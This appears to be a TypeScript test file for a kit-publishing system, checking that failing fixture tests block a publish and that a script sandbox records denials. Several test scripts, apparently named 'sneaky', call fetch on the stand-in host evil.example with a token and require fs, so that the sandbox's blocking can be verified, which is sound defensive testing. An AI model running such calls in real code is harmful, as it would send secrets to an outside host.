// kits publish: tests run on a fixture Space before a version goes live; a failing test blocks the publish and the last good version stays live (spec 2.21; ARCH 10.4).
// Also the test runner itself (space tests and script tests), test_run, health, denials and the host's script entry point.
// The migration is data: @reads keeps ci-select on this test instead of the whole suite.
// @reads /modules/kits/migrations/0001_kits.sql

import test from "node:test";
import assert from "node:assert/strict";
import { checkKit, configureKits, reportDenials, runKitScript, runKitTests } from "../handlers/index.ts";
import { subset } from "../handlers/publish.ts";
import { TRACE, FakeSpace, admin, harness, kitManifest, refused } from "../fixtures/db.ts";
import type { Harness } from "../fixtures/db.ts";

type Obj = Record<string, any>;   // eslint-disable-line @typescript-eslint/no-explicit-any

const v11 = (over: Obj = {}): Obj => kitManifest({ version: "1.1.0", ...over });
const passing = { name: "matter exists", kind: "space", expect: { events: [{ name: "schema.applied" }], views: [{ cap: "schema.types.list", rows: 1, contains: { name: "matter" } }] } };
const failing = { name: "needs a client type", kind: "space", expect: { views: [{ cap: "schema.types.list", contains: { name: "client" } }] } };

async function setup(h: Harness): Promise<string> {
  return h.shipped(); // 1.0.0 is live on stable, built in
}

const publish = (h: Harness, kitId: string, version: string, channel = "stable") => h.call("kits.publish", { kitId, version, channel });

// ---- publish ------------------------------------------------------------------------------------------------

test("a Kit publish is blocked when a fixture test fails: nothing is stored, the head does not move, the last good version stays live", async () => {
  const h = harness();
  const kitId = await setup(h);
  await h.call("kits.install", { kitId, accepted: true });
  const headBefore = h.rows("kits_head")[0]!.version_id;
  h.source.folder.set("law-intake@1.1.0", v11({ tests: [passing, failing] }));

  assert.deepEqual(await publish(h, kitId, "1.1.0"), { published: false });
  assert.deepEqual(h.events.map((e) => [e.name, e.payload]), [["kit.publish_blocked", { kitId, version: "1.1.0", failures: 1 }]]);
  assert.equal(h.rows("kits_version").length, 1, "no 1.1.0 row");
  assert.equal(h.rows("kits_head")[0]!.version_id, headBefore);
  const run = h.rows("kits_test_run")[0]!;
  assert.deepEqual([run.version, run.passed], ["1.1.0", 0]);
  assert.deepEqual(JSON.parse(String(run.failures)), [{ test: "needs a client type", message: 'view schema.types.list has no row like {"name":"client"}' }]);
  // the last good version is still what is live and installed
  assert.equal((await h.call("kits.get", { kitId })).kit.version, "1.0.0");
  assert.equal((await h.call("kits.versions", { kitId })).versions.length, 1);
  assert.deepEqual(await h.call("kits.health", { kitId }), { state: "down", denials: 0, lastTestAt: h.rows("kits_test_run")[0]!.at });

  // fixed in the folder, the same version publishes
  h.source.folder.set("law-intake@1.1.0", v11({ tests: [passing] }));
  assert.deepEqual(await publish(h, kitId, "1.1.0"), { published: true });
  assert.deepEqual(h.events.map((e) => [e.name, e.payload]), [["kit.published", { kitId, version: "1.1.0" }]]);
  assert.equal(h.rows("kits_version").length, 2);
  assert.equal((await h.call("kits.versions", { kitId })).versions[0].version, "1.1.0");
  assert.equal((await h.call("kits.health", { kitId })).state, "healthy");
  assert.equal(h.spaces.length, 3, "one fresh fixture Space per test per run, and each was closed");
  assert.ok(h.spaces.every((s) => s.closed));
});

test("publish: the Kit is applied to the fixture Space first, so a step that fails there blocks the publish", async () => {
  const h = harness({ fixture: () => { const s = new FakeSpace(); s.failOn = "automations.create"; return s; } });
  const kitId = await setup(h);
  h.source.folder.set("law-intake@1.1.0", v11({ tests: [passing] }));
  assert.deepEqual(await publish(h, kitId, "1.1.0"), { published: false });
  const failures = JSON.parse(String(h.rows("kits_test_run")[0]!.failures));
  assert.match(failures[0].message, /installing "Open a matter on new lead" failed: automations\.create failed in the fixture/);
});

test("publish: a Kit with no tests, a server with no fixture Space, a bad folder, a repeated or lower version and the other channel", async () => {
  const h = harness();
  const kitId = await setup(h);
  h.source.folder.set("law-intake@1.1.0", v11({ tests: undefined }));
  assert.deepEqual(await publish(h, kitId, "1.1.0"), { published: false });
  assert.match(JSON.parse(String(h.rows("kits_test_run")[0]!.failures))[0].message, /no tests/);
  assert.equal(h.events[0]!.payload.failures, 1);

  await refused(publish(h, kitId, "1.0.0"), "validation.precondition_failed"); // already published (built in)
  await refused(publish(h, kitId, "0.9.0"), "validation.precondition_failed"); // lower than the head
  await refused(publish(h, kitId, "1.2.0"), "validation.precondition_failed"); // nothing in the folder
  h.source.folder.set("law-intake@1.2.0", { key: "law-intake", version: "1.2.0" });
  await refused(publish(h, kitId, "1.2.0"), "validation.bad_input"); // not a valid Kit
  h.source.folder.set("law-intake@1.2.0", kitManifest({ key: "someone-else", version: "1.2.0" }));
  await refused(publish(h, kitId, "1.2.0"), "validation.bad_input");
  h.source.folder.set("law-intake@1.2.0", kitManifest({ version: "1.3.0" }));
  await refused(publish(h, kitId, "1.2.0"), "validation.bad_input");
  await refused(h.call("kits.publish", { kitId, version: "one", channel: "stable" }, admin, false), "validation.bad_input");
  await refused(h.call("kits.publish", { kitId, version: "1.2.0", channel: "nightly" }, admin, false), "validation.bad_input");
  assert.equal(h.rows("kits_version").length, 1);

  // beta has its own head: 1.0.0-beta.1 is lower than stable 1.0.0 but the first on beta
  h.source.folder.set("law-intake@1.0.1-beta.1", kitManifest({ version: "1.0.1-beta.1", tests: [passing] }));
  assert.deepEqual(await publish(h, kitId, "1.0.1-beta.1", "beta"), { published: true });
  assert.deepEqual(h.rows("kits_head").map((r) => r.channel).sort(), ["beta", "stable"]);
  assert.equal(JSON.parse(String(h.rows("kits_version").find((r) => r.version === "1.0.1-beta.1")!.content)).channel, "beta", "the published channel is stored with the version");

  const noFixture = harness({ fixture: false });
  const id2 = await noFixture.shipped();
  noFixture.source.folder.set("law-intake@1.1.0", v11({ tests: [passing] }));
  await refused(noFixture.call("kits.publish", { kitId: id2, version: "1.1.0", channel: "stable" }), "validation.precondition_failed");
  await refused(noFixture.call("kits.test_run", { kitId: id2 }), "validation.precondition_failed");
  assert.equal(noFixture.rows("kits_version").length, 1, "nothing was published untested");
});

// ---- the runner ---------------------------------------------------------------------------------------------

test("test_run: runs the working copy on a fixture Space and names each failing test; without a working copy it tests the head", async () => {
  const h = harness();
  const kitId = await setup(h);
  const head = await h.call("kits.test_run", { kitId });
  assert.deepEqual(head, { passed: true, failures: [] });
  h.source.workingCopies.set("law-intake", v11({ tests: [passing, failing, { name: "wrong rows", kind: "space", expect: { views: [{ cap: "schema.types.list", rows: 3 }] } }, { name: "missing event", kind: "space", expect: { events: [{ name: "form.submitted", payload: { form: "intake" } }] } }] }));
  const out = await h.call("kits.test_run", { kitId });
  assert.equal(out.passed, false);
  assert.deepEqual(out.failures.map((f: Obj) => f.test), ["needs a client type", "wrong rows", "missing event"]);
  assert.match(out.failures[1].message, /returned 1 rows, expected 3/);
  assert.match(out.failures[2].message, /expected the event form\.submitted with \{"form":"intake"\}; saw schema\.applied/);
  h.source.workingCopies.set("law-intake", { key: "bad" });
  const bad = await h.call("kits.test_run", { kitId });
  assert.equal(bad.passed, false);
  assert.equal(bad.failures[0].test, "(manifest)");
  assert.equal(h.rows("kits_test_run").length, 2, "an invalid manifest is reported, not recorded as a run");
});

test("runner: seed calls, event payload subsets, and a seed that fails", async () => {
  const kit = checkKit(kitManifest({
    tests: [
      { name: "seeded", kind: "space", seed: [{ cap: "records.create", input: { type: "matter", name: "Estate of Dana" } }], expect: { events: [{ name: "record.created", payload: { type: "matter" } }], views: [{ cap: "records.query", contains: { name: "Estate of Dana" } }] } },
      { name: "bad seed", kind: "space", seed: [{ cap: "records.boom", input: {} }], expect: {} },
    ],
  })).kit!;
  const spaces: FakeSpace[] = [];
  const failures = await runKitTests(kit, async () => {
    const s = new FakeSpace();
    s.answers.set("records.create", (i) => { s.log.push({ name: "record.created", payload: { type: i.type, id: "rec_1" } }); return {}; });
    s.answers.set("records.query", () => ({ rows: [{ name: "Estate of Dana", type: "matter" }] }));
    s.answers.set("records.boom", () => { throw new Error("no such capability"); });
    spaces.push(s);
    return s;
  });
  assert.deepEqual(failures, [{ test: "bad seed", message: "seed call records.boom failed: no such capability" }]);
  assert.equal(spaces.length, 2);
  assert.ok(spaces.every((s) => s.closed));
  assert.equal(subset({ a: [{ b: 1 }] }, { a: [{ b: 1, c: 2 }, { d: 3 }], z: 1 }), true);
  assert.equal(subset({ a: 1 }, { a: 2 }), false);
  assert.equal(subset([1, 2], [2, 1, 3]), true);
});

test("runner: script tests check the value, the error and the denials; an unexpected denial fails the test", async () => {
  const kit = checkKit(kitManifest({
    scripts: [
      { name: "fee", source: "return { fee: input.hours * 250 };", caps: [] },
      { name: "lookup", source: "const r = await api.call('records.query', { type: 'matter' }); return r.rows.length;", caps: ["records.query"] },
      { name: "sneaky", source: "return await fetch('https://evil.example/steal');", caps: [] },
      { name: "boom", source: "throw new Error('bad hours');", caps: [] },
    ],
    tests: [
      { name: "fee works", kind: "script", script: "fee", input: { hours: 3 }, expect: { value: { fee: 750 } } },
      { name: "fee wrong", kind: "script", script: "fee", input: { hours: 3 }, expect: { value: { fee: 1 } } },
      { name: "lookup reads the fixture", kind: "script", script: "lookup", expect: { value: 2 } },
      { name: "network is denied", kind: "script", script: "sneaky", expect: { denied: ["network call to evil.example"] } },
      { name: "denial missing", kind: "script", script: "fee", input: { hours: 1 }, expect: { denied: ["require"] } },
      { name: "unexpected denial", kind: "script", script: "sneaky", expect: {} },
      { name: "error expected", kind: "script", script: "boom", expect: { error: "bad hours" } },
      { name: "error not expected", kind: "script", script: "boom", expect: {} },
    ],
  })).kit!;
  const failures = await runKitTests(kit, async () => {
    const s = new FakeSpace();
    s.answers.set("records.query", () => ({ rows: [{ id: 1 }, { id: 2 }] }));
    return s;
  });
  assert.deepEqual(failures.map((f) => f.test), ["fee wrong", "denial missing", "unexpected denial", "error not expected"]);
  assert.match(failures[0]!.message, /returned \{"fee":750\}, expected \{"fee":1\}/);
  assert.match(failures[1]!.message, /expected a denial containing "require"; saw none/);
  assert.match(failures[2]!.message, /unexpected sandbox denial: network call to evil\.example/);
  assert.match(failures[3]!.message, /the script failed: bad hours/);
});

// ---- denials, health, running a script ----------------------------------------------------------------------------------------

test("denials from a real script run are stored with the trace id and emit sandbox.denied; the Kit's health turns degraded", async () => {
  const h = harness();
  const kitId = await h.shipped(kitManifest({
    scripts: [{ name: "sneaky", source: "try { await fetch('https://evil.example/x?token=abc'); } catch (e) {} const fs = require('fs'); return 1;", caps: ["records.query"] }, { name: "ok", source: "return input.n + 1;", caps: [] }],
  }));
  await h.call("kits.install", { kitId, accepted: true });
  const ctx = h.ctxFor(null);
  const ok = await runKitScript(ctx, kitId, "ok", { n: 41 });
  assert.deepEqual([ok.ok, ok.value, ok.denials], [true, 42, []]);
  assert.equal(h.events.filter((e) => e.name === "sandbox.denied").length, 0);

  const bad = await runKitScript(ctx, kitId, "sneaky");
  assert.equal(bad.ok, false);
  assert.deepEqual(bad.denials, ["network call to evil.example", "require(fs)"]);
  const rows = h.rows("kits_denial");
  assert.deepEqual(rows.map((r) => [r.what, r.trace_id]), [["network call to evil.example", TRACE], ["require(fs)", TRACE]]);
  const denied = (await h.call("kits.denials", { kitId })).denials;
  assert.deepEqual(denied.map((d: Obj) => d.what).sort(), ["network call to evil.example", "require(fs)"]);
  assert.ok(denied.every((d: Obj) => d.traceId === TRACE));
  assert.equal(h.events.length, 0, "the events were emitted on the script run, not on this read");
  assert.deepEqual(await h.call("kits.health", { kitId }), { state: "degraded", denials: 2 });
  h.advance(8 * 24 * 3600_000);
  assert.deepEqual(await h.call("kits.health", { kitId }), { state: "healthy", denials: 0 }, "denials older than a week no longer count");
  await refused(runKitScript(ctx, kitId, "nope"), "validation.not_found");
  const idle = await h.shipped(kitManifest({ key: "idle", title: "Idle" }));
  await refused(runKitScript(ctx, idle, "ok"), "validation.precondition_failed");
});

test("reportDenials emits the event with the trace id and the kits.denials list pages", async () => {
  const h = harness();
  const kitId = await h.shipped();
  const ctx = h.ctxFor(null);
  for (let i = 0; i < 5; i++) {
    reportDenials(ctx, kitId, [`api.call records.delete ${i}`]);
    h.advance(1000);
  }
  assert.equal(h.events.length, 5);
  assert.deepEqual(h.events[0]!.payload, { kitId, what: "api.call records.delete 0", traceId: TRACE });
  assert.equal(h.events[0]!.subject, `kit/${kitId}`);
  const p1 = await h.call("kits.denials", { kitId, limit: 2 });
  assert.deepEqual(p1.denials.map((d: Obj) => d.what), ["api.call records.delete 4", "api.call records.delete 3"]);
  assert.equal(p1.total, 5);
  assert.equal(p1.next, "2");
  assert.equal((await h.call("kits.denials", { kitId, limit: 2, cursor: "4" })).next, undefined);
  await refused(h.call("kits.denials", { kitId: "kit_gone" }), "validation.not_found");
});

test("cleanup", () => {
  configureKits(null);
});
